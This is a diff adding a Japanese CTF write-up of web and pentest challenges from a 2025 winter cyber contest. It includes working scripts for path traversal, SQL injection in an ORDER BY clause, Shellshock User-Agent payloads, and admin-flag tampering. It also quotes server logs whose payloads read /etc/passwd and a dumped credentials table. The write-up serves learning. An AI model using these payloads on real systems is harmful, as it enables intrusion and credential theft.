@@ -441,3 +441,361 @@ flagSeedパラメータの値に応じて1~2の文字が返されます。
 ```
 flag{114,47,0,53,0,95,0,71,6,19,39}
 ```
+
+## WE
+
+### 簡単には見せません
+
+Webサイトからフラグを取り出す問題です。
+とりあえず情報が少ないので/robots.txtを見てみます。
+```
+User-Agent:*
+Disallow:/
+Disallow:/red/
+Disallow:/gold/
+Disallow:/yellow/
+Disallow:/blue/
+Disallow:/pink/
+Disallow:/black/
+```
+これらのディレクトリがあったので、1つずつ見ていきます。
+/blueにflgというディレクトリがあったので見てみると、そこにフラグが書かれていました。
+```
+flag{TakeMeToTheFlag}
+```
+
+### 試練を乗り越えろ！
+
+質問に対して回答を送ることで、次の問題へと移るサイトです。
+10000問解ければフラグがもらえるようです。
+URLをよく見てみると
+```
+qCount=1&answer=1
+```
+というデータがPOSTされていました。
+qCount、answer共に同じ数値が入ります。
+例えば一問目はqCount=1&answer=1で正解となりました。
+このことから、1万問目に正解するにはqCount=10000&answer=10000とすれば良さそうです。
+```javascript
+(async () => {
+    const baseUrl = "https://we2-prod.2025winter-cybercontest.net/";
+    const res = await fetch(baseUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "qCount=10000&answer=10000&submit=submit"
+    });
+    console.log(await res.text());
+})();
+```
+これを送るとフラグがもらえました。
+```
+flag{WinThroughTheGame}
+```
+
+### 直してる最中なんです
+
+どうにかしてWebサーバ内の/etc/WE-3というファイルにアクセスする問題です。
+サイトにアクセスすると複数の画像が表示されたページが出てきます。
+ソースを見てみると、/secret/download.phpにリクエストを送り、ローカルに保存されている画像ファイルを取得していました。
+```php
+<?php
+$file_name = $_POST["fName"];
+
+$file_path = dirname(__FILE__).'/'.$file_name;
+
+$download_file_name = $file_name;
+
+header('Content-Type: application/force-download;');
+header('Content-Length: '.filesize($file_path));
+header('Content-Disposition: attachment; filename="'.$file_name.'"');
+readfile($download_file_name);
+?>
+```
+ユーザ入力に何もチェックが入っていないので、パストラバーサルの脆弱性があります。
+以下のパスを/etc/WE-3にすることでフラグが格納されたファイルを読み込むことができました。
+```javascript
+(async () => {
+    const baseUrl = "https://we3-prod.2025winter-cybercontest.net/";
+    const res = await fetch(baseUrl + "secret/download.php", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "fName=/etc/WE-3"
+    });
+    console.log(await res.text());
+})();
+```
+```
+flag{fGrantUB56skBTlmF14mostFP}
+```
+
+### 直接聞いてみたら？
+
+Webサイトに行くと名前、メールアドレス、電話番号、住所を表示するページに行きます。
+HTTPリクエストの内容を見てみます。
+```
+{"name": "name", "value": "on"},
+{"name": "email", "value": "on"},
+{"name": "tel", "value": "on"},
+{"name": "address", "value": "on"}
+```
+というJSONのデータがPOSTされていました。
+name、email、tel、addressが上記の4つの情報を対応しているようです。
+ということでこのエンドポイントにフラグを直接聞いてみます。
+```javascript
+(async () => {
+    let res;
+    const baseUrl = "https://we4-prod.2025winter-cybercontest.net/";
+    const payload = [
+        {"name": "name", "value": "on"},
+        {"name": "email", "value": "on"},
+        {"name": "tel", "value": "on"},
+        {"name": "address", "value": "on"},
+        {"name": "flag", "value": "on"}
+    ];
+    const b64Payload = btoa(JSON.stringify(payload));
+    res = await fetch(baseUrl);
+    const session = res.headers.getSetCookie();
+    res = await fetch(baseUrl + "json.php", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Cookie": session
+        },
+        body: `data=${b64Payload}`
+    });
+    console.log(await res.text());
+})();
+```
+```
+flag{ParameterHandlingError}
+```
+
+### 整列！
+
+フラグの情報がDBに格納されており、それをWebサイト越しに取得する問題です。
+WEの中で一番面白かったです。
+index.phpに行くとDBに保存されているであろうレコードが表示されたページが出てきます。
+この情報からカラムはid、data、flagSeqの3つだと分かります。
+ページ上で?sort=data+ASCなどとパラメータを指定することで並び替えを行うこともできます。
+ですが、どうやってもレコードの数が少ないです。
+例えば?sort=flagSeq+ASCで並び変えても最初の20行ぐらいしか出てきません。
+ここでASCという文字に着目します。
+これはMySQLのORDER BY句で使用される値です。
+ここから内部で実行されるSQL文が推測できます。
+```php
+query("SELECT * FROM table ORDER BY " . $userQuery . " LIMIT 20");
+```
+するとASCの最後にコメントアウトを行うと以下のようなSQL文になります。
+```sql
+SELECT * FROM table ORDER BY flagSeq ASC;-- LIMIT 20
+```
+これで出力される行の数が少なくなる問題が解決できそうです。
+```javascript
+(async () => {
+    const jsdom = require("jsdom");
+
+
+    let res;
+    let result = "";
+    const baseUrl = "https://we5-prod.2025winter-cybercontest.net/";
+    res = await fetch(baseUrl);
+    const session = res.headers.getSetCookie();
+    res = await fetch(baseUrl + "/index.php?sort=flagSeq+ASC;--", {
+        method: "GET",
+        headers: {
+            "Cookie": session
+        }
+    });
+    const dom = new jsdom.JSDOM(await res.text());
+    const tbody = dom.getElementsByTagName("tbody")[0];
+    const trows = tbody.getElementsByTagName("tr");
+    for (let i = 0; i < trows.length; i++) {
+        result += trows[i].getElementsByTagName("td")[1].innerText;
+    }
+    console.log(result);
+})();
+```
+上記のスクリプトで出てきたフラグの断片を一文字ずつ連結させていき、フラグを完成させます。
+```
+flag{6f24d2267d87b7b232ed0d6ed3ad2924}
+```
+
+## PW
+
+### CVE-2014-7169他
+
+Webサーバのログファイルが渡され、そこから攻撃ペイロードを組み立てて/etc/PW-1のファイルを読み取る問題です。
+まずは問題文にあるCVEの概要を調べます。
+どうやらcgiに関連するCVEのようです。
+exploitdbに実際のexploitコードがあったので、見てみます。(https://www.exploit-db.com/exploits/34766)
+以下はその一部を抜粋したものです。
+```php
+$context = stream_context_create(
+	array(
+		'http' => array(
+			'method'  => 'GET',
+			'header'  => 'User-Agent: () { :;}; /bin/bash -c "'.$cmd.'"'
+		)
+	)
+);
+```
+exploitコードからUser-Agentヘッダにペイロードを埋め込めばいいことが分かります。
+次にWebサーバのログファイルを見ていきます。
+```
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/a.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/b.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/c.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/d.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/e.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/f.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/g.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/h.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/i.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/j.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/k.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/l.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/m.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/n.cgi HTTP/1.1" 200 2007 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/o.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/p.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/q.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/r.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/s.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/t.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/u.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/v.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/x.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/y.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/z.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/v.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
+```
+/cgi-bin/n.cgiだけレスポンスが長いことから、このcgiが怪しそうです。
+後はログファイルにあるペイロードのコマンド部分を/etc/PW-1を読み取るコマンドに変更すれば攻撃コードの完成です。
+```javascript
+(async () => {
+    const baseUrl = "https://pw1-prod.2025winter-cybercontest.net/";
+    const res = await fetch(baseUrl + "cgi-bin/n.cgi", {
+        method: "GET",
+        headers: {
+            "User-Agent": "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/PW-1"
+        }
+    });
+    console.log(await res.text());
+})();
+```
+```
+flag{>:(!shellshock!}
+```
+
+### 認証は認可の後
+
+どうにかログインに成功して、フラグを取得する問題です。
+最初にログインページに飛ぶので、まずは適当に値を入力してリクエストの内容を見てみます。
+```
+POST /auth.php
+Content-Type: application/x-www-form-urlencoded
+
+name=test&password=test&pass-re=test
+```
+これらのパラメータの値にSQLiがないか調べていると、nameパラメータにSQLを埋め込めることが分かりました。
+そこから頑張ってテーブル内のクレデンシャルを抜き出していきます。
+最終的に以下のようなクレデンシャルが抜き出せました。
+```
++-----+----------+--------------------+-------------+---------+
+| uid | uname    | name               | passwd      | secret  |
++-----+----------+--------------------+-------------+---------+
+| 1   | mikawa01 | Ieyasu Tokugawa    | ndJs83GD    | No flag |
+| 2   | nagoya01 | Hideyoshi Toyotomi | jNfo0Opopl  | No flag |
+| 3   | sendai01 | Masamune Date      | knDhys98hTh | No flag |
+| 4   | owari01  | Nobunaga Oda       | knDdd98hTh  | No flag |
++-----+----------+--------------------+-------------+---------+
+```
+ここから適当に一つ選んでログインしてみました。
+ログインに成功するとユーザ情報を表示するページに飛びます。
+そこにはフラグを表示というボタンがあるのですが、フラグは管理者にしか表示されませんと言われてしまい、フラグを取り出せません。
+ボタンを押した際に送信されるリクエストを見てみると以下のようなものでした。
+```
+POST /flag.php
+Content-Type: application/x-www-form-urlencoded
+Cookie: ユーザのセッション
+
+admin=0
+```
+adminの値を1にすればいけるのではと思いやってみたところ、アドミンアカウントとして認識してくれました。
+```javascript
+(async () => {
+    let res;
+    const baseUrl = "https://pw2-prod.2025winter-cybercontest.net/";
+    const credentials = "name=mikawa01&password=ndJs83GD&pass-re=ndJs83GD";
+    res = await fetch(baseUrl + "auth.php", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        redirect: "manual",
+        body: credentials
+    });
+    const session = res.headers.getSetCookie();
+    console.log(session);
+    res = await fetch(baseUrl + "flag.php", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Cookie": session
+        },
+        redirect: "manual",
+        body: "admin=1"
+    });
+    console.log(await res.text());
+})();
+```
+実は他の方のwriteupを見てみると、普通に' or 1=1のような簡単なペイロードで認証を突破していました。
+わざわざクレデンシャルを抜き出さなくてもよかったですね。
+```
+flag{DoNotUseParameter2Auth}
+```
+
+## TR
+
+### Windowsで解きましょう
+
+フラグを生成するbatファイルが渡されます。
+その中にはいくつかダミーのファイルも生成されるようになっています。
+本物にだけはある目印を付けているとのことでした。
+以下がそのbatファイルになります。
+```bat
+@echo off
+setlocal
+set FDATA1=23
+set FDATA2=61
+set FDATA3=34
+set FDATA4=25
+set FDATA5=75
+set FDATA6=64
+set FDATA7=93
+set FDATA8=44
+set FDATA9=72
+md flags
+chdir flags
+for /l %%n in (10,1,99) do (
+  type null > flags_%%n.txt
+  echo flag{%FDATA5%%FDATA4%%%n%FDATA1%%FDATA6%%FDATA2%%%n%FDATA3%%FDATA7%%FDATA9%%FDATA8%} > flags_%%n.txt
+  if %%n==%FDATA4% echo > flags_%%n.txt:TrueFlag
+)
+
+endlocal
+```
+最後のif文から%FDATA4%番目のファイルが本物だと分かります。
+%FDATA4%は25なので、flags_25.txtの内容がフラグになります。
+```
+flag{7525252364612534937244}
+```
+
+## 終わりに
+
+今回は久しぶりのCTFでしたが65位と二桁に食い込めて嬉しかったです。
+Wiresharkのフィルタのかけ方を学べたり、ログファイルから攻撃コードを作成する新鮮な問題に出会えたりと新鮮なCTFでした。
